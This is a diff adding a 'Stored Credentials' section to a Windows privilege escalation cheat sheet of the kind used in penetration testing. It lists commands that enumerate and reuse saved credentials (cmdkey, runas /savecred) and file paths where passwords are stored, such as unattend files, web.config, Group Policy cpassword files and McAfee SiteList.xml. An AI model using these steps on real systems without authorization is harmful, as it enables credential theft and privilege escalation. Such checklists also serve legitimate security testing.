@@ -60,6 +60,38 @@ Windows Privilege Escalation Methodology
 * reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
 * reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
 
+## Stored Crendentials
+* cmdkey /list
+  -> if interactive module enabled 100% runas as other user
+  -> if domain and user exist try again runas as other user
+
+  * runas /savecred /user:<Domain>\<user> C:\<path>\<exefile>
+
+* Stored as plaintext or base64
+  * C:\unattend.xml
+  * C:\Windows\Panther\Unattend.xml
+  * C:\Windows\Panther\Unattend\Unattend.xml
+  * C:\Windows\system32\sysprep.inf
+  * C:\Windows\system32\sysprep\sysprep.xml
+  
+* If system is running an IIS web server the web.config file:
+  * C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+  * C:\inetpub\wwwroot\web.config
+
+* Local administrators passwords can also retrieved via the Group Policy Preferences:
+  * C:\ProgramData\Microsoft\Group Policy\History????\Machine\Preferences\Groups\Groups.xml
+  * \????\SYSVOL\Policies????\MACHINE\Preferences\Groups\Groups.xml
+
+* Except of the Group.xml file the cpassword attribute can be found in other policy preference files as well such as:
+  * Services\Services.xml
+  * ScheduledTasks\ScheduledTasks.xml
+  * Printers\Printers.xml
+  * Drives\Drives.xml
+  * DataSources\DataSources.xml
+
+* Most Windows systems they are running McAfee as their endpoint protection. The password is stored encrypted in the SiteList.xml file:
+  * %AllUsersProfile%Application Data\McAfee\Common Framework\SiteList.xml
+
 ## Windows Kernel Exploits
 * systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Processor(s)" /C:"System Locale" /C:"Input Locale" /C:"Domain" /C:"Hotfix(s)"
   * searchsploit 
